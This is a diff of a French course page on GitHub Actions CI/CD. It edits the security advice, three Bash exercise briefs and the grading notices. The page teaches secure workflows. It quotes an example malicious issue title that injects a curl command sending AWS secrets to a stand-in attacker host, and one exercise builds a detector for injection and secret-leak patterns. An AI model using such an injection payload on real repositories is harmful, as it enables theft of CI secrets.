@@ -13,7 +13,7 @@
 <link rel="icon" href="/assets/img/favicon.svg" type="image/svg+xml">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&amp;display=swap">
 <link rel="stylesheet" href="/assets/css/tokens.css">
 <link rel="stylesheet" href="../assets/css/cours.css">
 <link rel="stylesheet" href="/assets/css/code-lab.css">
@@ -51,7 +51,7 @@
 </div></nav>
 
 <main id="content" class="b3-githubwrap">
-<p class="crumb"><a href="../index.html">Git & GitHub B3</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 5</p>
+<p class="crumb"><a href="../index.html">Git &amp; GitHub B3</a> › <a href="../sommaire.html">Sommaire</a> › Chapitre 5</p>
 
 <h1>Chapitre 5 — Automatisation &amp; CI/CD avec GitHub Actions</h1>
 
@@ -75,7 +75,7 @@
       <li>concevoir des matrices d’exécution (strategy.matrix) pour valider le code sur plusieurs systèmes d’exploitation et versions de langages ;</li>
       <li>identifier et neutraliser les failles critiques d’injection de commande shell dans les contextes dynamiques ${{ github.event... }} ;</li>
       <li>appliquer le principe du moindre privilège aux tokens d’authentification automatiques (GITHUB_TOKEN) via le bloc permissions ;</li>
-      <li>développer en Python 3 des auditeurs de syntaxe de workflow, des expandeurs de matrices et des scanners de vulnérabilités CI/CD.</li>
+      <li>développer en scripts Bash et commandes Git des auditeurs de syntaxe de workflow, des expandeurs de matrices et des scanners de vulnérabilités CI/CD.</li>
     </ol>
   </div>
 
@@ -137,11 +137,12 @@
 <p>Comme GitHub Actions résout l’expression <code>${{ ... }}</code> par substitution textuelle brute <strong>avant</strong> de passer le script au shell bash, un attaquant qui soumet une issue avec le titre suivant :</p>
 <pre><code>Test"; curl -s https://evil.attacker/exfil?token=$AWS_SECRET_ACCESS_KEY; echo "Fin</code></pre>
 <p>provoquera l’exécution directe de la commande arbitraire <code>curl</code> dans le runner, exfiltrant les secrets du dépôt !</p>
-<p><strong>Remédiation obligatoire :</strong> Toujours passer les entrées non fiables par des <strong>variables d’environnement intermédiaires</strong> :</p>
-<pre><code>- name: Traitement securise
+<p><strong>Réduction du risque :</strong> transmettre la valeur non fiable par une variable d’environnement intermédiaire évite son insertion textuelle directe dans le script :</p>
+<pre><code>- name: Traiter le titre
   env:
     ISSUE_TITLE: ${{ github.event.issue.title }}
-  run: echo "Nouveau titre : $ISSUE_TITLE"</code></pre>
+  run: printf '%s\n' "$ISSUE_TITLE"</code></pre>
+<p>Cette technique ne garantit pas tous les usages : placer les expansions entre guillemets, valider les arguments selon la commande appelée et ne jamais réinterpréter la donnée avec <code>eval</code>. Utiliser un séparateur d’options lorsque la commande le prend en charge.</p>
   </div>
 
 <h2>4. Secrets de Dépôt, Principe du Moindre Privilège &amp; GITHUB_TOKEN</h2>
@@ -168,14 +169,12 @@
 </div>
 
 <!-- code-labs:start -->
+  <div id="exercices">
   <h2>5. Exercices de code</h2>
-  <p class="lead">Ces trois exercices se font dans la page. L’éditeur du navigateur exécute le code
-  et la validation fait tourner des jeux de tests indépendants :
-  réussir l’exemple affiché ne suffit donc pas, il faut traiter le cas général.</p>
-  <p>En cas d’erreur, le bouton <strong>Expliquer mon erreur</strong> interroge le tuteur : il décrit ce qui
-  s’est passé et par où chercher, sans jamais écrire le code de la solution — c’est le principe de l’exercice.</p>
+  <p class="lead">La correction automatique de ce cours est temporairement suspendue pendant la vérification des exercices. Les énoncés et les exemples restent disponibles.</p>
 <div class="lab" id="gh3-c5-e1" data-lab
      data-exercise="gh3-c5-e1"
+     data-grading-suspended="1"
      data-language="shell"
      data-height="300"
      data-stdin="NAME=CI-Pipeline&#10;TRIGGERS=push,pull_request&#10;JOB id=build runs_on=ubuntu-latest steps_count=3">
@@ -189,23 +188,14 @@ echo "A_COMPLETER"
     <h3 class="lab__title">Exercice 1 — Validateur de structure de workflow GitHub Actions</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Bash</span>
+      <span class="lab__training">Entraînement, non noté</span>
       <span class="badge badge--n1">Niveau 1 — Acquisition</span>
     </div>
   </div>
   <div class="lab__body">
-    <p class="lab__goal"><strong>Objectif :</strong> Analyser la spécification d’un pipeline GitHub Actions et valider la présence des blocs obligatoires.</p>
-    <div class="lab__brief"><p>Un workflow GitHub Actions (fichier <code>.github/workflows/*.yml</code>) doit respecter une arborescence minimale :<br><br>
-Critères de conformité :<br>
-1. <code>name</code> : doit être renseigné (chaîne non vide).<br>
-2. Déclencheurs <code>on:</code> : au moins un événement déclencheur parmi <code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code>, <code>schedule</code>.<br>
-3. <code>jobs</code> : au moins un job déclaré. Chaque job doit obligatoirement comporter :<br>
-   - Une cible d'exécution <code>runs-on</code> (ex: <code>ubuntu-latest</code>, <code>windows-latest</code>).<br>
-   - Au moins une étape <code>step</code> déclarée.<br><br>
-Le script Bash lit les données sur l’entrée standard (stdin)...&gt;</code><br>
-<code>JOB id=&lt;id&gt; runs_on=&lt;runner|NONE&gt; steps_count=&lt;n&gt;</code>.<br><br>
-Pour le workflow, afficher :<br>
-<code>WORKFLOW_AUDIT name="{nom}" status={VALID | ERREUR} triggers_count={n} jobs_count={m}</code><br>
-Erreurs possibles : <code>MISSING_NAME</code>, <code>MISSING_TRIGGERS</code>, <code>NO_JOBS</code>, <code>JOB_MISSING_RUNS_ON</code>, <code>JOB_ZERO_STEPS</code>.</p></div>
+    <p class="lab__goal"><strong>Objectif :</strong> Vérifier un profil pédagogique simplifié de workflow GitHub Actions représenté sous forme de lignes.</p>
+    <p class="lab__note" id="gh3-c5-e1-grading-notice">La correction automatique de ce cours est temporairement suspendue pendant la vérification des exercices.</p>
+    <div class="lab__brief"><p>Vérifiez un <strong>profil simplifié</strong> de workflow, et non un fichier YAML réel. Dans ce profil, le nom doit être non vide, au moins un déclencheur reconnu doit être présent et chaque job doit avoir un runner et au moins une étape. Ce ne sont pas des obligations universelles de GitHub Actions : le nom du workflow est facultatif, et un job peut appeler un workflow réutilisable avec une structure différente.<br><br>L'entrée contient <code>NAME=&lt;nom&gt;</code>, <code>TRIGGERS=&lt;événements séparés par des virgules&gt;</code> et zéro ou plusieurs lignes <code>JOB id=&lt;id&gt; runs_on=&lt;runner|NONE&gt; steps_count=&lt;n&gt;</code>. Les événements sont distincts et sans espaces ; seuls <code>push</code>, <code>pull_request</code>, <code>workflow_dispatch</code> et <code>schedule</code> sont reconnus par ce profil. Le nom peut contenir des espaces, mais pas de guillemet double ; les autres champs ne contiennent pas d'espaces. Les nombres sont des entiers de 0 à 2 147 483 647.<br><br>Vérifiez dans l'ordre le nom, les déclencheurs, l'existence de jobs, puis chaque job dans l'ordre d'entrée (runner avant étapes). Affichez <code>WORKFLOW_AUDIT name="{nom}" status={VALID|MISSING_NAME|MISSING_TRIGGERS|NO_JOBS|JOB_MISSING_RUNS_ON|JOB_ZERO_STEPS} triggers_count={n} jobs_count={m}</code>. Comptez uniquement les déclencheurs reconnus et tous les jobs déclarés.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Entrée du programme</b><pre>NAME=CI-Pipeline
 TRIGGERS=push,pull_request
@@ -216,8 +206,8 @@ JOB id=build runs_on=ubuntu-latest steps_count=3</pre></div>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
       <ol>
-        <li>Valider les prérequis dans l’ordre : name, triggers, jobs, puis les contraintes par job.</li>
-        <li>S’arrêter au premier défaut identifié.</li>
+        <li>Vérifiez d’abord les conditions globales, puis les jobs dans l’ordre de déclaration.</li>
+        <li>Retournez uniquement le premier motif d’échec tout en comptant tous les jobs.</li>
       </ol>
     </details>
   </div>
@@ -225,6 +215,7 @@ JOB id=build runs_on=ubuntu-latest steps_count=3</pre></div>
 
 <div class="lab" id="gh3-c5-e2" data-lab
      data-exercise="gh3-c5-e2"
+     data-grading-suspended="1"
      data-language="shell"
      data-height="300"
      data-stdin="MATRIX_DEF os=ubuntu,macos version=3.11,3.12&#10;EXCLUDE os=macos version=3.11">
@@ -238,22 +229,14 @@ echo "A_COMPLETER"
     <h3 class="lab__title">Exercice 2 — Générateur et évaluateur de matrice de build (strategy: matrix)</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Bash</span>
+      <span class="lab__training">Entraînement, non noté</span>
       <span class="badge badge--n2">Niveau 2 — Application</span>
     </div>
   </div>
   <div class="lab__body">
     <p class="lab__goal"><strong>Objectif :</strong> Calculer le produit cartésien des axes d’une matrice de test GitHub Actions et gérer les exclusions.</p>
-    <div class="lab__brief"><p>La directive <code>strategy: matrix</code> permet d'exécuter un job en parallèle sur de multiples combinaisons d'environnements (OS x Version de langage).<br><br>
-Spécification :<br>
-- Liste d'OS : <code>os=&lt;os1,os2...&gt;</code>.<br>
-- Liste de versions de runtime : <code>version=&lt;v1,v2...&gt;</code>.<br>
-- Exclusions optionnelles (<code>EXCLUDE os=&lt;os&gt; version=&lt;v&gt;</code>).<br><br>
-Le script Bash lit les données sur l’entrée standard (stdin).<br><br>
-Le script doit calculer la liste des combinaisons valides (produit cartésien moins exclusions), triée par OS puis par version, et afficher :<br>
-Chaque combinaison :<br>
-<code>JOB_INSTANCE os={os} version={v} tag="{os}-{v}"</code><br>
-Et la ligne récapitulative :<br>
-<code>MATRIX_TOTAL instances={n} excluded={nb_exclus}</code></p></div>
+    <p class="lab__note" id="gh3-c5-e2-grading-notice">La correction automatique de ce cours est temporairement suspendue pendant la vérification des exercices.</p>
+    <div class="lab__brief"><p>Simulez une matrice GitHub Actions avec deux axes. L'entrée commence par <code>MATRIX_DEF os=&lt;os1,os2,...&gt; version=&lt;v1,v2,...&gt;</code>, suivie de zéro ou plusieurs exclusions <code>EXCLUDE os=&lt;os&gt; version=&lt;v&gt;</code>. Chaque valeur d'axe est distincte, non vide et composée de lettres, chiffres, points, tirets ou soulignés ; un axe peut être entièrement vide.<br><br>Parcourez les OS dans leur ordre de déclaration et, pour chacun, les versions dans leur ordre de déclaration ; ce n'est pas un tri alphabétique. Retirez chaque paire exclue, sans compter plusieurs fois une exclusion répétée et sans compter les exclusions hors matrice. Pour chaque paire restante, affichez <code>JOB_INSTANCE os={os} version={v} tag="{os}-{v}"</code>, puis <code>MATRIX_TOTAL instances={n} excluded={nb_paires_retirées}</code>. Cet ordre de génération ne garantit pas l'ordre réel d'exécution des jobs parallèles.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Entrée du programme</b><pre>MATRIX_DEF os=ubuntu,macos version=3.11,3.12
 EXCLUDE os=macos version=3.11</pre></div>
@@ -266,8 +249,8 @@ MATRIX_TOTAL instances=3 excluded=1</pre></div>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
       <ol>
-        <li>Générer toutes les paires (o, v) via deux boucles imbriquées.</li>
-        <li>Filtrer les paires présentes dans l’ensemble des exclusions.</li>
+        <li>Parcourez les valeurs des deux axes avec deux boucles imbriquées, dans leur ordre d’entrée.</li>
+        <li>Stockez les exclusions comme ensemble de paires ; comptez uniquement les paires effectivement retirées.</li>
       </ol>
     </details>
   </div>
@@ -275,6 +258,7 @@ MATRIX_TOTAL instances=3 excluded=1</pre></div>
 
 <div class="lab" id="gh3-c5-e3" data-lab
      data-exercise="gh3-c5-e3"
+     data-grading-suspended="1"
      data-language="shell"
      data-height="300"
      data-stdin="STEP_INSPECT id=1 cmd=echo &quot;Le titre est ${{ github.event.issue.title }}&quot;&#10;STEP_INSPECT id=2 cmd=echo ${{ secrets.AWS_KEY }}">
@@ -288,22 +272,14 @@ echo "A_COMPLETER"
     <h3 class="lab__title">Exercice 3 — Détecteur d’injections de commandes et fuites de secrets dans les Actions</h3>
     <div class="lab__meta">
       <span class="lab__lang"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-terminal"></use></svg> Bash</span>
+      <span class="lab__training">Entraînement, non noté</span>
       <span class="badge badge--n3">Niveau 3 — Raisonnement</span>
     </div>
   </div>
   <div class="lab__body">
-    <p class="lab__goal"><strong>Objectif :</strong> Auditer les étapes de scripts GitHub Actions pour détecter les failles d’injection de commande et divulgation de secrets.</p>
-    <div class="lab__brief"><p>Dans GitHub Actions, l’utilisation imprudente d’expressions de contexte dans la directive <code>run:</code> expose le runner à une exécution de code arbitraire (RCE) ou à l'exfiltration de jetons secrets.<br><br>
-Vulnérabilités à détecter :<br>
-1. <strong>Fuite de secret (Secret Leak)</strong> : présence de <code>secrets.</code> ou <code>GITHUB_TOKEN</code> à l'intérieur d'une commande <code>echo</code> ou <code>print</code>.<br>
-   -> Verdict : <code>VULN_EXPOSED_SECRET</code>.<br>
-2. <strong>Injection de commande shell</strong> : concaténation directe d'entrées utilisateur non fiables au sein de la ligne de commande <code>run:</code>, telles que <code>${{ github.event.issue.title }}</code>, <code>${{ github.event.issue.body }}</code>, <code>${{ github.event.comment.body }}</code>, <code>${{ github.head_ref }}</code>.<br>
-   (La bonne pratique est de passer par des variables d'environnement <code>env:</code>).<br>
-   -> Verdict : <code>VULN_COMMAND_INJECTION</code>.<br>
-3. Sinon : étape conforme (<code>SECURE</code>).<br><br>
-Le script Bash lit les paramètres sur l’entrée standard (stdin).<br><br>
-Pour chaque étape, afficher :<br>
-<code>ACTION_AUDIT step={id} status={SECURE|VULN_EXPOSED_SECRET|VULN_COMMAND_INJECTION}</code></p></div>
+    <p class="lab__goal"><strong>Objectif :</strong> Repérer quelques motifs explicites de divulgation et d’injection dans des commandes GitHub Actions.</p>
+    <p class="lab__note" id="gh3-c5-e3-grading-notice">La correction automatique de ce cours est temporairement suspendue pendant la vérification des exercices.</p>
+    <div class="lab__brief"><p>Analysez chaque ligne <code>STEP_INSPECT id=&lt;id&gt; cmd=&lt;commande&gt;</code> avec les règles lexicales suivantes, dans cet ordre :<br>1. Si la commande contient le mot <code>echo</code> ou <code>print</code> et contient aussi <code>secrets.</code> ou <code>GITHUB_TOKEN</code>, affichez <code>VULN_EXPOSED_SECRET</code>.<br>2. Sinon, si elle contient une interpolation directe <code>${{ github.event.issue.title }}</code>, <code>${{ github.event.issue.body }}</code>, <code>${{ github.event.comment.body }}</code> ou <code>${{ github.head_ref }}</code>, affichez <code>VULN_COMMAND_INJECTION</code>. Les espaces autour du nom dans <code>${{ ... }}</code> sont facultatifs.<br>3. Sinon, affichez <code>SECURE</code>.<br><br>La sortie est <code>ACTION_AUDIT step={id} status={statut}</code>. Les identifiants sont sans espaces ; la commande peut en contenir. Ce détecteur est une heuristique limitée : <code>SECURE</code> signifie seulement qu'aucun des motifs indiqués n'a été trouvé, pas que la commande est sûre. Transmettre une valeur non fiable par une variable d'environnement évite son interpolation directe dans le script, mais il faut encore la citer et la valider selon son usage.</p></div>
     <div class="lab__sample">
       <div class="lab__sample-part"><b>Entrée du programme</b><pre>STEP_INSPECT id=1 cmd=echo "Le titre est ${{ github.event.issue.title }}"
 STEP_INSPECT id=2 cmd=echo ${{ secrets.AWS_KEY }}</pre></div>
@@ -314,12 +290,13 @@ ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET</pre></div>
     <details class="lab__hints">
       <summary><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-lightbulb"></use></svg> Deux indices, rédigés en mots</summary>
       <ol>
-        <li>Vérifier d’abord si echo affiche un secret.</li>
-        <li>Vérifier la présence d’expressions de contexte non assainies dans la commande.</li>
+        <li>Cherchez d’abord les mots echo ou print associés à un marqueur de secret.</li>
+        <li>Cherchez ensuite les quatre interpolations explicites ; l’absence de ces motifs ne prouve pas la sécurité.</li>
       </ol>
     </details>
   </div>
 </div>
+  </div>
   <!-- code-labs:end -->
   <h2>6. QCM — niveau examen</h2>
 
@@ -358,11 +335,11 @@ ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET</pre></div>
       <p class="q__stem">Quelle est la méthode recommandée pour assainir l’utilisation d’un paramètre dynamique issu de l’événement GitHub dans un script shell ?</p>
       <div class="opts">
         <button class="opt">L’encoder en base64 dans le message de commit</button>
-        <button class="opt" data-correct="1">Le déclarer dans le bloc « env: » de l’étape et manipuler la variable d’environnement correspondante dans le script</button>
+        <button class="opt" data-correct="1">Le transmettre via « env: », citer l’expansion et valider la valeur selon son usage</button>
         <button class="opt">Désactiver l’interpréteur bash au profit de sh standard</button>
         <button class="opt">Exécuter le workflow uniquement sur des machines Windows</button>
       </div>
-      <div class="q__exp">En passant la valeur via le bloc env: (ex: BRANCH: ${{ github.head_ref }}), le moteur transmet la donnée comme valeur d’environnement et le shell ne tente pas de l’interpréter comme du code exécutable.</div>
+      <div class="q__exp">Le bloc env: évite la substitution directe dans le script, mais ne sécurise pas automatiquement tous les usages : citer l’expansion, valider les arguments et éviter eval.</div>
     </div>
     <div class="q">
       <p class="q__stem">Que produit la directive « strategy.matrix » avec os: [ubuntu, windows] et node: [18, 20] ?</p>
@@ -411,7 +388,7 @@ ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET</pre></div>
   <div class="box box--pitfall">
     <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-warning"></use></svg> À reconnaître en examen</div>
     <ul>
-      <li>Écrire ${{ github.head_ref }} ou ${{ github.event... }} directement dans un script bash exécuté dans run:.</li>
+      <li>Écrire <code>${{ github.head_ref }}</code> ou <code>${{ github.event... }}</code> directement dans un script bash exécuté dans run:.</li>
       <li>Laisser les permissions par défaut en lecture/écriture complète pour le GITHUB_TOKEN sur tous les dépôts.</li>
       <li>Faire un echo d’un secret dans un fichier temporaire qui est ensuite archivé comme artifact public du workflow.</li>
       <li>Oublier le drapeau fail-fast: false lorsqu’on souhaite obtenir le rapport de test complet sur tous les OS.</li>
@@ -456,7 +433,7 @@ ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET</pre></div>
     </ul>
     <h3>Les 8 notions à connaître absolument</h3>
     <ol>
-      <li>Workflows déclaratifs YAML</li><li>Événements déclencheurs (push, PR, cron)</li><li>Runners hébergés & auto-hébergés</li><li>Stratégie matricielle (strategy.matrix)</li><li>Directive fail-fast</li><li>Injection de commande shell (CWE-78)</li><li>Variables d’environnement intermédiaires (env:)</li><li>Principe du moindre privilège & GITHUB_TOKEN</li>
+      <li>Workflows déclaratifs YAML</li><li>Événements déclencheurs (push, PR, cron)</li><li>Runners hébergés &amp; auto-hébergés</li><li>Stratégie matricielle (strategy.matrix)</li><li>Directive fail-fast</li><li>Injection de commande shell (CWE-78)</li><li>Variables d’environnement intermédiaires (env:)</li><li>Principe du moindre privilège &amp; GITHUB_TOKEN</li>
     </ol>
     <p><a class="btn" href="cartes.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-cards"></use></svg> Réviser avec les flashcards</a>
        <a class="btn" href="formules.html"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-file"></use></svg> Mémo syntaxe</a></p>
@@ -468,7 +445,7 @@ ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET</pre></div>
     <div class="box__title"><svg class="ic" aria-hidden="true" focusable="false"><use href="/assets/img/ui-icons.svg#i-chart"></use></svg> Comment vous auto-évaluer</div>
     <p>Le QCM ci-dessus est un test de maîtrise. Lisez votre pourcentage :</p>
     <div class="bands">
-      <div class="bandrow bandrow--low"><strong>< 50 % — </strong>Difficultés à écrire un workflow YAML basique ou utilisation naïve d’expressions dynamiques dans les commandes shell.</div>
+      <div class="bandrow bandrow--low"><strong>&lt; 50 % — </strong>Difficultés à écrire un workflow YAML basique ou utilisation naïve d’expressions dynamiques dans les commandes shell.</div>
       <div class="bandrow bandrow--mid"><strong>50–69 % — </strong>Compréhension partielle : reprenez les sections où une erreur subsiste et refaites les exercices des niveaux 1 et 2.</div>
       <div class="bandrow bandrow--good"><strong>70–94 % — </strong>Bonne maîtrise de la syntaxe de workflow, utilisation des matrices strategy.matrix et passage des paramètres par variables d’environnement.</div>
       <div class="bandrow bandrow--top"><strong>≥ 95 % — </strong>Conception avancée de pipelines CI/CD sécurisés, épinglage cryptographique des actions, gestion du moindre privilège et durcissement anti-injections expert.</div>
@@ -482,7 +459,7 @@ ACTION_AUDIT step=2 status=VULN_EXPOSED_SECRET</pre></div>
   </div>
 
   <p class="disclaimer">Objectif de maîtrise 19/20 — votre note réelle dépend aussi de votre travail.
-  Sources : Documentation officielle Git Pro (Scott Chacon & Ben Straub), spécification Conventional Commits 1.0.0, documentation officielle GitHub Actions et guides de durcissement GitHub Security Hardening.</p>
+  Sources : Documentation officielle Git Pro (Scott Chacon &amp; Ben Straub), spécification Conventional Commits 1.0.0, documentation officielle GitHub Actions et guides de durcissement GitHub Security Hardening.</p>
 </main>
 
 <script src="../assets/js/cours.js"></script>
